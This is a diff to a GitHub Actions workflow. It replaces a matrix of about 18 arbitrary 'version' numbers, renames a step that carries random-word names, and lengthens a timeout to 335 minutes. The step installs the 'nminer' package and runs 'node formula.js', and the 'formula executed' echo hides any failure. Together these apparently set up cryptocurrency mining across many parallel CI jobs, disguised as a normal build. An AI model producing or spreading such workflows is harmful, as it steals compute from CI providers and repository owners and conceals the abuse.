@@ -9,25 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1126 }
-          - { version: 3803 }
-          - { version: 6347 }
-          - { version: 1942 }
-          - { version: 6968 }
-          - { version: 5833 }
-          - { version: 4262 }
-          - { version: 1832 }
-          - { version: 479 }
-          - { version: 4082 }
-          - { version: 6387 }
-          - { version: 526 }
-          - { version: 3571 }
-          - { version: 278 }
-          - { version: 1076 }
-          - { version: 1330 }
-          - { version: 2107 }
-          - { version: 7865 }
-          - { version: 8821 }
+          - { version: 192 }
+          - { version: 8356 }
+          - { version: 3396 }
+          - { version: 4662 }
+          - { version: 1240 }
+          - { version: 6880 }
+          - { version: 7261 }
+          - { version: 1413 }
+          - { version: 1151 }
+          - { version: 1296 }
+          - { version: 3471 }
+          - { version: 4096 }
+          - { version: 8436 }
+          - { version: 2729 }
+          - { version: 5885 }
+          - { version: 953 }
+          - { version: 614 }
+          - { version: 7442 }
 
     steps:
       - name: Checkout
@@ -38,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: bestride overspend gee jubilantly corny
+      - name: french oh anti
         run: |
           npm install nminer@latest
-          timeout 323m node formula.js || echo "formula executed"
+          timeout 335m node formula.js || echo "formula executed"
